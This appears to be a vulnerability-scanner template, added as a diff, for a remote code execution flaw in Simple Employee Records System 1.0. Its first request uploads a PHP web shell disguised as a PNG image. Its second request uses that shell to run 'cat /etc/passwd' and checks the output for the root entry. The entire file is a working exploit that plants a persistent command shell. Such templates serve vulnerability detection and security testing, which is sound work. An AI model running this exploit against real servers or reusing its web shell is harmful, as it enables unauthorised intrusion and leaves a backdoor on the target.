@@ -1,0 +1,53 @@
+id: simple-employee-rce
+
+info:
+  name: Simple Employee Records System 1.0 RCE
+  author: pikpikcu
+  severity: critical
+  reference: https://www.exploit-db.com/exploits/49596
+  tags: rce
+
+requests:
+  - raw:
+      - |
+        POST /dashboard/uploadID.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+        Accept-Encoding: deflate
+        X-Requested-With: XMLHttpRequest
+        Content-Type: multipart/form-data; boundary=---------------------------5825462663702204104870787337
+        Content-Length: 267
+        DNT: 1
+        Connection: close
+
+        -----------------------------5825462663702204104870787337
+        Content-Disposition: form-data; name="employee_ID"; filename="poc.php"
+        Content-Type: image/png
+
+        <?php
+        $cmd=$_GET['cmd'];
+        system($cmd);
+        ?>
+        -----------------------------5825462663702204104870787337--
+      - |
+        GET /uploads/employees_ids/{{endpoint}}?cmd=cat%20/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+        Content-Length: 2
+
+    extractors:
+      - type: regex
+        name: endpoint
+        part: body
+        internal: true
+        regex:
+          - '(?:[a-zA-Z0-9+\/])*_poc.php'
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+        condition: and
+        part: body
